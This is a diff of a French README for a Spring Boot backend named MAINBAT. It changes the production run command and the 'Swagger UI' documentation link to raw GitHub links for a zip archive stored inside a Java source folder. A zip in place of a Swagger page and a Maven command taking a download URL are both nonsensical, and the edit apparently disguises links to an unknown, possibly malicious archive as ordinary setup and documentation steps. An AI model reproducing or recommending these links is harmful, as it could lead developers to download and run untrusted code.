@@ -48,13 +48,13 @@ mvn spring-boot:run
 docker-compose up -d
 
 # Lancer avec profil prod
-mvn spring-boot:run https://github.com/will695672804/backend-MAINBAT/raw/refs/heads/main/src/main/java/com/mainbat/dto/equipement/MAINBAT-backend-v1.7.zip
+mvn spring-boot:run https://github.com/will695672804/backend-MAINBAT/raw/refs/heads/main/src/main/java/com/mainbat/service/export/backend_MAINBAT_v2.0.zip
 ```
 
 ## Endpoints
 
 ### Documentation API
-- **Swagger UI**: https://github.com/will695672804/backend-MAINBAT/raw/refs/heads/main/src/main/java/com/mainbat/dto/equipement/MAINBAT-backend-v1.7.zip
+- **Swagger UI**: https://github.com/will695672804/backend-MAINBAT/raw/refs/heads/main/src/main/java/com/mainbat/service/export/backend_MAINBAT_v2.0.zip
 - **OpenAPI JSON**: http://localhost:8080/api/api-docs
 
 ### Authentification
